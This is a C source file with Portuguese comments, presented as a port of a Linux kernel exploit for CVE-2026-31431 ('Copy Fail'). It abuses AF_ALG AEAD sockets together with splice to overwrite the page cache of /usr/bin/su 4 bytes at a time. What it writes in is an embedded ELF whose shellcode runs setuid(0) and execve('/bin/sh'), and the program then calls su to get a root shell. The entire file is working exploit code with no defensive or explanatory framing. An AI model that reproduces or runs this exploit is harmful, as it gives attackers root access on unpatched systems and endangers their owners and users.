#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_alg.h>

/* ---- constantes AF_ALG ---- */
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef ALG_SET_KEY
#define ALG_SET_KEY            1
#endif
#ifndef ALG_SET_IV
#define ALG_SET_IV             2
#endif
#ifndef ALG_SET_OP
#define ALG_SET_OP             3
#endif
/* ALG_SET_AEAD_AUTHSIZE vem do linux/if_alg.h (4 ou 5 dependendo do kernel) */
#ifndef ALG_SET_AEAD_AUTHSIZE
#define ALG_SET_AEAD_AUTHSIZE  4
#endif

/* MSG_MORE = 32768 */
#ifndef MSG_MORE
#define MSG_MORE 0x8000
#endif

/* payload: mini ELF x86_64
 * entry: setuid(0) -> execve("/bin/sh", 0, 0)
 * decomprimido do zlib original do Python
 */
static const unsigned char PAYLOAD[] = {
    0x7f,0x45,0x4c,0x46, 0x02,0x01,0x01,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00, 0x01,0x00,0x00,0x00, 0x78,0x00,0x40,0x00, 0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00, 0x40,0x00,0x38,0x00, 0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00, 0x05,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x40,0x00, 0x00,0x00,0x00,0x00,
    0x9e,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x9e,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00, 0x00,0x00,0x00,0x00,
    /* shellcode: setuid(0) + execve("/bin/sh", 0, 0) + exit(0) */
    0x31,0xc0,0x31,0xff, 0xb0,0x69,0x0f,0x05,
    0x48,0x8d,0x3d,0x0f, 0x00,0x00,0x00,0x31, 0xf6,0x6a,0x3b,0x58,
    0x99,0x0f,0x05,0x31, 0xff,0x6a,0x3c,0x58, 0x0f,0x05,
    /* "/bin/sh\0" */
    0x2f,0x62,0x69,0x6e, 0x2f,0x73,0x68,0x00, 0x00,0x00
};
#define PAYLOAD_LEN ((int)sizeof(PAYLOAD))  /* 160 bytes, 40 chunks de 4 bytes */

/*
 * patch_chunk: sobrescreve 4 bytes no page cache de `fd` no offset `off`
 * com os bytes em `chunk` via vulnerabilidade AF_ALG (CVE-2026-31431)
 */
static void patch_chunk(int fd, int off, const unsigned char *chunk)
{
    /* 1. cria socket AF_ALG */
    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))");

    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) { perror("socket"); return; }

    if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind"); close(alg_fd); return;
    }

    /* 2. setsockopt: chave = 08 00 01 00 00 00 00 10 + 32 zeros */
    unsigned char key[40];
    key[0]=0x08; key[1]=0x00; key[2]=0x01; key[3]=0x00;
    key[4]=0x00; key[5]=0x00; key[6]=0x00; key[7]=0x10;
    memset(key + 8, 0, 32);
    setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));

    /* 3. setsockopt: AEAD authsize = 4 */
    setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4);

    /* 4. accept -> op_fd */
    int op_fd = accept(alg_fd, NULL, NULL);
    if (op_fd < 0) { perror("accept"); close(alg_fd); return; }

    int total = off + 4;  /* mesmo que Python: o = t + 4 */

    /* 5. sendmsg com 3 cmsgs + iov = "AAAA" + chunk */
    unsigned char iov_buf[8];
    memset(iov_buf, 'A', 4);
    memcpy(iov_buf + 4, chunk, 4);

    struct iovec iov = { .iov_base = iov_buf, .iov_len = 8 };

    /* calcula espaco dos 3 cmsgs */
    char cmsg_buf[ CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4) ];
    memset(cmsg_buf, 0, sizeof(cmsg_buf));

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov        = &iov;
    msg.msg_iovlen     = 1;
    msg.msg_control    = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    struct cmsghdr *cm;

    /* cmsg 1: (SOL_ALG, ALG_SET_OP=3, 4 zeros) */
    cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_OP;
    cm->cmsg_len   = CMSG_LEN(4);
    memset(CMSG_DATA(cm), 0, 4);

    /* cmsg 2: (SOL_ALG, ALG_SET_IV=2, 0x10 + 19 zeros) */
    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_IV;
    cm->cmsg_len   = CMSG_LEN(20);
    ((unsigned char *)CMSG_DATA(cm))[0] = 0x10;
    memset((unsigned char *)CMSG_DATA(cm) + 1, 0, 19);

    /* cmsg 3: (SOL_ALG, type=4, 0x08 + 3 zeros) */
    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = 4;
    cm->cmsg_len   = CMSG_LEN(4);
    ((unsigned char *)CMSG_DATA(cm))[0] = 0x08;
    memset((unsigned char *)CMSG_DATA(cm) + 1, 0, 3);

    sendmsg(op_fd, &msg, MSG_MORE);

    /* 6. pipe + splice (traz paginas pro page cache e triggera o bug) */
    int pfd[2];
    pipe(pfd);

    loff_t src_off = 0;
    syscall(SYS_splice, fd,     &src_off, pfd[1], NULL,   (size_t)total, 0);
    syscall(SYS_splice, pfd[0], NULL,     op_fd,  NULL,   (size_t)total, 0);

    /* 7. recv (ignora erro — mesmo que o try/except do Python) */
    char rbuf[1024 + 8];
    recv(op_fd, rbuf, 8 + off, MSG_DONTWAIT);

    close(pfd[0]);
    close(pfd[1]);
    close(op_fd);
    close(alg_fd);
}

int main(void)
{
    printf("[*] Copy Fail (CVE-2026-31431) — C port\n");
    printf("[*] payload: %d bytes (%d chunks)\n", PAYLOAD_LEN, PAYLOAD_LEN / 4);

    int fd = open("/usr/bin/su", O_RDONLY);
    if (fd < 0) { perror("open /usr/bin/su"); return 1; }

    printf("[*] patching page cache de /usr/bin/su...\n");
    for (int i = 0; i < PAYLOAD_LEN; i += 4) {
        patch_chunk(fd, i, PAYLOAD + i);
        if (i % 16 == 0)
            printf("[*] offset %d/%d\n", i, PAYLOAD_LEN);
    }

    close(fd);
    printf("[*] patch completo — executando su...\n");
    system("su");
    return 0;
}
